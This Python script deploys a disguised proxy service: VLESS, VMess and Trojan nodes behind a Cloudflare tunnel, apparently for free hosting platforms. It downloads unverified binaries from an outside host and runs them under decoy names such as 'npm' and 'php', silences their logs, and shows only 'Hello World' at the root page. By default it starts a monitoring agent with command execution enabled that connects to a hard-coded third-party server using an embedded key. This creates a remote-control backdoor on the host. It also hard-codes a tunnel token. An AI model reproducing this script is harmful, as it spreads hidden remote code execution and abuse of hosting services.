import os
import re
import json
import time
import base64
import shutil
import asyncio
import requests
import platform
import subprocess
import threading
from threading import Thread
from http.server import BaseHTTPRequestHandler, HTTPServer

# Environment variables
UPLOAD_URL = os.environ.get('UPLOAD_URL', '')
PROJECT_URL = os.environ.get('PROJECT_URL', '')
AUTO_ACCESS = os.environ.get('AUTO_ACCESS', 'false').lower() == 'true'
FILE_PATH = os.environ.get('FILE_PATH', '.cache')
SUB_PATH = os.environ.get('SUB_PATH', 'sb')
UUID = os.environ.get('UUID', '907e9841-7abb-4013-91a4-3894d9e41928')
NEZHA_SERVER = os.environ.get('NEZHA_SERVER', 'mbb.svip888.us.kg:53100')
NEZHA_PORT = os.environ.get('NEZHA_PORT', '')
NEZHA_KEY = os.environ.get('NEZHA_KEY', 'VnrTnhgoack6PhnRH6lyshe4OVkHmPyM')
ARGO_DOMAIN = os.environ.get('ARGO_DOMAIN', 'share.svip888.us.kg')
ARGO_AUTH = os.environ.get('ARGO_AUTH', 'eyJhIjoiMGU3ZjI2MWZiY2ExMzcwNzZhNGZmODcxMzU3ZjYzNGQiLCJ0IjoiMTZhMjE2MjItNzZjNS00MzE0LWIxMzAtYzNlNjYxNzA5NmYyIiwicyI6IlpEYzJNR1ZsTVdZdE5UWm1ZUzAwWlRJeExXSTRNell0T0RJMVlXRTJNMlpsT1RZNSJ9')
ARGO_PORT = int(os.environ.get('ARGO_PORT', '8001'))
CFIP = os.environ.get('CFIP', 'spring.io')
CFPORT = int(os.environ.get('CFPORT', '443'))
NAME = os.environ.get('NAME', '')
CHAT_ID = os.environ.get('CHAT_ID', '')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
PORT = int(os.environ.get('SERVER_PORT') or os.environ.get('PORT') or 3000)

# Create running folder
def create_directory():
    print('\033c', end='')
    if not os.path.exists(FILE_PATH):
        os.makedirs(FILE_PATH)
        print(f"{FILE_PATH} is created")
    else:
        print(f"{FILE_PATH} already exists")

# Global variables
npm_path = os.path.join(FILE_PATH, 'npm')
php_path = os.path.join(FILE_PATH, 'php')
web_path = os.path.join(FILE_PATH, 'web')
bot_path = os.path.join(FILE_PATH, 'bot')
sub_path = os.path.join(FILE_PATH, 'sub.txt')
list_path = os.path.join(FILE_PATH, 'list.txt')
boot_log_path = os.path.join(FILE_PATH, 'boot.log')
config_path = os.path.join(FILE_PATH, 'config.json')

# Delete nodes
def delete_nodes():
    try:
        if not UPLOAD_URL or not os.path.exists(sub_path):
            return

        with open(sub_path, 'r') as file:
            file_content = file.read()

        decoded = base64.b64decode(file_content).decode('utf-8')
        nodes = [line for line in decoded.split('\n') if any(protocol in line for protocol in ['vless://', 'vmess://', 'trojan://', 'hysteria2://', 'tuic://'])]

        if nodes:
            try:
                requests.post(f"{UPLOAD_URL}/api/delete-nodes",
                              data=json.dumps({"nodes": nodes}),
                              headers={"Content-Type": "application/json"})
            except:
                return None
    except Exception as e:
        print(f"Error in delete_nodes: {e}")
        return None

# Clean up old files
def cleanup_old_files():
    paths_to_delete = ['web', 'bot', 'npm', 'php', 'boot.log', 'list.txt']
    for file in paths_to_delete:
        file_path = os.path.join(FILE_PATH, file)
        try:
            if os.path.exists(file_path):
                if os.path.isdir(file_path):
                    shutil.rmtree(file_path)
                else:
                    os.remove(file_path)
        except Exception as e:
            print(f"Error removing {file_path}: {e}")

# HTTP Server
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'Hello World')
        elif self.path == f'/{SUB_PATH}':
            try:
                with open(sub_path, 'rb') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(content)
            except:
                self.send_response(404)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        pass

# System architecture
def get_system_architecture():
    architecture = platform.machine().lower()
    if 'arm' in architecture or 'aarch64' in architecture:
        return 'arm'
    else:
        return 'amd'

# Download file
def download_file(file_name, file_url):
    file_path = os.path.join(FILE_PATH, file_name)
    try:
        response = requests.get(file_url, stream=True)
        response.raise_for_status()
        with open(file_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        print(f"Download {file_name} successfully")
        return True
    except Exception as e:
        if os.path.exists(file_path):
            os.remove(file_path)
        print(f"Download {file_name} failed: {e}")
        return False

# Get files for architecture
def get_files_for_architecture(architecture):
    if architecture == 'arm':
        base_files = [
            {"fileName": "web", "fileUrl": "https://arm64.ssss.nyc.mn/web"},
            {"fileName": "bot", "fileUrl": "https://arm64.ssss.nyc.mn/2go"}
        ]
    else:
        base_files = [
            {"fileName": "web", "fileUrl": "https://amd64.ssss.nyc.mn/web"},
            {"fileName": "bot", "fileUrl": "https://amd64.ssss.nyc.mn/2go"}
        ]

    if NEZHA_SERVER and NEZHA_KEY:
        if NEZHA_PORT:
            npm_url = "https://arm64.ssss.nyc.mn/agent" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/agent"
            base_files.insert(0, {"fileName": "npm", "fileUrl": npm_url})
        else:
            php_url = "https://arm64.ssss.nyc.mn/v1" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/v1"
            base_files.insert(0, {"fileName": "php", "fileUrl": php_url})

    return base_files

# Authorize files
def authorize_files(file_paths):
    for relative_file_path in file_paths:
        absolute_file_path = os.path.join(FILE_PATH, relative_file_path)
        if os.path.exists(absolute_file_path):
            try:
                os.chmod(absolute_file_path, 0o775)
                print(f"Empowerment success for {absolute_file_path}: 775")
            except Exception as e:
                print(f"Empowerment failed for {absolute_file_path}: {e}")

# Argo tunnel config
def argo_type():
    if not ARGO_AUTH or not ARGO_DOMAIN:
        print("ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels")
        return
    if "TunnelSecret" in ARGO_AUTH:
        with open(os.path.join(FILE_PATH, 'tunnel.json'), 'w') as f:
            f.write(ARGO_AUTH)
        tunnel_id = ARGO_AUTH.split('"')[11]
        tunnel_yml = f"""
tunnel: {tunnel_id}
credentials-file: {os.path.join(FILE_PATH, 'tunnel.json')}
protocol: http2

ingress:
  - hostname: {ARGO_DOMAIN}
    service: http://localhost:{ARGO_PORT}
    originRequest:
      noTLSVerify: true
  - service: http_status:404
"""
        with open(os.path.join(FILE_PATH, 'tunnel.yml'), 'w') as f:
            f.write(tunnel_yml)
    else:
        print("Use token connect to tunnel,please set the {ARGO_PORT} in cloudflare")

# Execute command
def exec_cmd(command):
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()
        return stdout + stderr
    except Exception as e:
        print(f"Error executing command: {e}")
        return str(e)

# Download and run files
async def download_files_and_run():
    architecture = get_system_architecture()
    files_to_download = get_files_for_architecture(architecture)
    if not files_to_download:
        print("Can't find a file for the current architecture")
        return
    download_success = True
    for file_info in files_to_download:
        if not download_file(file_info["fileName"], file_info["fileUrl"]):
            download_success = False
    if not download_success:
        print("Error downloading files")
        return

    files_to_authorize = ['npm', 'web', 'bot'] if NEZHA_PORT else ['php', 'web', 'bot']
    authorize_files(files_to_authorize)

    port = NEZHA_SERVER.split(":")[-1] if ":" in NEZHA_SERVER else ""
    nezha_tls = "true" if port in ["443", "8443", "2096", "2087", "2083", "2053"] else "false"

    if NEZHA_SERVER and NEZHA_KEY and not NEZHA_PORT:
        config_yaml = f"""
client_secret: {NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 4
server: {NEZHA_SERVER}
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: {nezha_tls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: {UUID}"""
        with open(os.path.join(FILE_PATH, 'config.yaml'), 'w') as f:
            f.write(config_yaml)

    # Generate JSON config
    config ={"log":{"access":"/dev/null","error":"/dev/null","loglevel":"none",},"inbounds":[{"port":ARGO_PORT ,"protocol":"vless","settings":{"clients":[{"id":UUID ,"flow":"xtls-rprx-vision",},],"decryption":"none","fallbacks":[{"dest":3001 },{"path":"/vless-argo","dest":3002 },{"path":"/vmess-argo","dest":3003 },{"path":"/trojan-argo","dest":3004 },],},"streamSettings":{"network":"tcp",},},{"port":3001 ,"listen":"127.0.0.1","protocol":"vless","settings":{"clients":[{"id":UUID },],"decryption":"none"},"streamSettings":{"network":"ws","security":"none"}},{"port":3002 ,"listen":"127.0.0.1","protocol":"vless","settings":{"clients":[{"id":UUID ,"level":0 }],"decryption":"none"},"streamSettings":{"network":"ws","security":"none","wsSettings":{"path":"/vless-argo"}},"sniffing":{"enabled":True ,"destOverride":["http","tls","quic"],"metadataOnly":False }},{"port":3003 ,"listen":"127.0.0.1","protocol":"vmess","settings":{"clients":[{"id":UUID ,"alterId":0 }]},"streamSettings":{"network":"ws","wsSettings":{"path":"/vmess-argo"}},"sniffing":{"enabled":True ,"destOverride":["http","tls","quic"],"metadataOnly":False }},{"port":3004 ,"listen":"127.0.0.1","protocol":"trojan","settings":{"clients":[{"password":UUID },]},"streamSettings":{"network":"ws","security":"none","wsSettings":{"path":"/trojan-argo"}},"sniffing":{"enabled":True ,"destOverride":["http","tls","quic"],"metadataOnly":False }},],"outbounds":[{"protocol":"freedom","tag": "direct" },{"protocol":"blackhole","tag":"block"}]}
    with open(os.path.join(FILE_PATH, 'config.json'), 'w', encoding='utf-8') as config_file:
        json.dump(config, config_file, ensure_ascii=False, indent=2)

    # Run nezha
    if NEZHA_SERVER and NEZHA_PORT and NEZHA_KEY:
        tls_ports = ['443', '8443', '2096', '2087', '2083', '2053']
        nezha_tls = '--tls' if NEZHA_PORT in tls_ports else ''
        command = f"nohup {os.path.join(FILE_PATH, 'npm')} -s {NEZHA_SERVER}:{NEZHA_PORT} -p {NEZHA_KEY} {nezha_tls} >/dev/null 2>&1 &"
        exec_cmd(command)
        print('npm is running')
        time.sleep(1)
    elif NEZHA_SERVER and NEZHA_KEY:
        command = f"nohup {FILE_PATH}/php -c \"{FILE_PATH}/config.yaml\" >/dev/null 2>&1 &"
        exec_cmd(command)
        print('php is running')
        time.sleep(1)
    else:
        print('NEZHA variable is empty, skipping running')

    # Run sbX
    command = f"nohup {os.path.join(FILE_PATH, 'web')} -c {os.path.join(FILE_PATH, 'config.json')} >/dev/null 2>&1 &"
    exec_cmd(command)
    print('web is running')
    time.sleep(1)

    # Run cloudflared
    if os.path.exists(os.path.join(FILE_PATH, 'bot')):
        if re.match(r'^[A-Z0-9a-z=]{120,250}$', ARGO_AUTH):
            args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token {ARGO_AUTH}"
        elif "TunnelSecret" in ARGO_AUTH:
            args = f"tunnel --edge-ip-version auto --config {os.path.join(FILE_PATH, 'tunnel.yml')} run"
        else:
            args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {os.path.join(FILE_PATH, 'boot.log')} --loglevel info --url http://localhost:{ARGO_PORT}"
        exec_cmd(f"nohup {os.path.join(FILE_PATH, 'bot')} {args} >/dev/null 2>&1 &")
        print('bot is running')
    time.sleep(5)
    await extract_domains()

# Extract domains
async def extract_domains():
    argo_domain = None
    if ARGO_AUTH and ARGO_DOMAIN:
        argo_domain = ARGO_DOMAIN
        print(f'ARGO_DOMAIN: {argo_domain}')
        await generate_links(argo_domain)
    else:
        try:
            with open(boot_log_path, 'r') as f:
                file_content = f.read()
            lines = file_content.split('\n')
            argo_domains = [re.search(r'https?://([^ ]*trycloudflare\.com)/?', line).group(1)
                            for line in lines if re.search(r'https?://([^ ]*trycloudflare\.com)/?', line)]
            if argo_domains:
                argo_domain = argo_domains[0]
                print(f'ArgoDomain: {argo_domain}')
                await generate_links(argo_domain)
            else:
                print('ArgoDomain not found, re-running bot')
                if os.path.exists(boot_log_path):
                    os.remove(boot_log_path)
                try:
                    exec_cmd('pkill -f "[b]ot" > /dev/null 2>&1')
                except:
                    pass
                time.sleep(1)
                args = f'tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {FILE_PATH}/boot.log --loglevel info --url http://localhost:{ARGO_PORT}'
                exec_cmd(f'nohup {os.path.join(FILE_PATH, "bot")} {args} >/dev/null 2>&1 &')
                print('bot is running.')
                time.sleep(6)
                await extract_domains()
        except Exception as e:
            print(f'Error reading boot.log: {e}')

# Upload nodes
def upload_nodes():
    if UPLOAD_URL and PROJECT_URL:
        subscription_url = f"{PROJECT_URL}/{SUB_PATH}"
        try:
            response = requests.post(f"{UPLOAD_URL}/api/add-subscriptions",
                                     json={"subscription": [subscription_url]},
                                     headers={"Content-Type": "application/json"})
            if response.status_code == 200:
                print('Subscription uploaded successfully')
        except:
            pass
    elif UPLOAD_URL and os.path.exists(list_path):
        with open(list_path, 'r') as f:
            content = f.read()
        nodes = [line for line in content.split('\n') if any(proto in line for proto in ['vless://', 'vmess://', 'trojan://', 'hysteria2://', 'tuic://'])]
        if not nodes:
            return
        try:
            response = requests.post(f"{UPLOAD_URL}/api/add-nodes",
                                     data=json.dumps({"nodes": nodes}),
                                     headers={"Content-Type": "application/json"})
            if response.status_code == 200:
                print('Nodes uploaded successfully')
        except:
            return

# Telegram push
def send_telegram():
    if not BOT_TOKEN or not CHAT_ID:
        return
    try:
        with open(sub_path, 'r') as f:
            message = f.read()
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        escaped_name = re.sub(r'([_*\[\]()~>#+=|{}.!\-])', r'\\\1', NAME)
        requests.post(url, params={"chat_id": CHAT_ID, "text": f"**{escaped_name}节点推送通知**\n{message}", "parse_mode": "MarkdownV2"})
        print('Telegram sent successfully')
    except Exception as e:
        print(f"Failed to send Telegram: {e}")

# Generate links (curl -> requests)
async def generate_links(argo_domain):
    try:
        resp = requests.get('https://api.ip.sb/geoip', headers={'User-Agent': 'Mozilla/5.0'}, timeout=5)
        resp.raise_for_status()
        geo_data = resp.json()
    except Exception as e:
        print(f"Failed to get geo info: {e}")
        geo_data = {"country_code": "Unknown", "isp": "Unknown"}

    country_code = geo_data.get('country_code', 'Unknown')
    isp = geo_data.get('isp', 'Unknown').replace(' ', '_').strip()
    ISP = f"{NAME.strip()}-{country_code}_{isp}" if NAME and NAME.strip() else f"{country_code}_{isp}"

    time.sleep(2)
    VMESS = {
        "v": "2",
        "ps": f"{ISP}",
        "add": CFIP,
        "port": CFPORT,
        "id": UUID,
        "aid": "0",
        "scy": "none",
        "net": "ws",
        "type": "none",
        "host": argo_domain,
        "path": "/vmess-argo?ed=2560",
        "tls": "tls",
        "sni": argo_domain,
        "alpn": "",
        "fp": "chrome"
    }

    list_txt = f"""
vless://{UUID}@{CFIP}:{CFPORT}?encryption=none&security=tls&sni={argo_domain}&fp=chrome&type=ws&host={argo_domain}&path=%2Fvless-argo%3Fed%3D2560#{ISP}
  
vmess://{ base64.b64encode(json.dumps(VMESS).encode('utf-8')).decode('utf-8')}

trojan://{UUID}@{CFIP}:{CFPORT}?security=tls&sni={argo_domain}&fp=chrome&type=ws&host={argo_domain}&path=%2Ftrojan-argo%3Fed%3D2560#{ISP}
    """

    with open(os.path.join(FILE_PATH, 'list.txt'), 'w', encoding='utf-8') as list_file:
        list_file.write(list_txt)

    sub_txt = base64.b64encode(list_txt.encode('utf-8')).decode('utf-8')
    with open(os.path.join(FILE_PATH, 'sub.txt'), 'w', encoding='utf-8') as sub_file:
        sub_file.write(sub_txt)

    print(sub_txt)
    print(f"{FILE_PATH}/sub.txt saved successfully")

    send_telegram()
    upload_nodes()
    return sub_txt

# Main
if __name__ == "__main__":
    create_directory()
    cleanup_old_files()
    argo_type()
    asyncio.run(download_files_and_run())

    server = HTTPServer(('', PORT), RequestHandler)
    print(f'Server running on port {PORT}')
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("Server stopped")
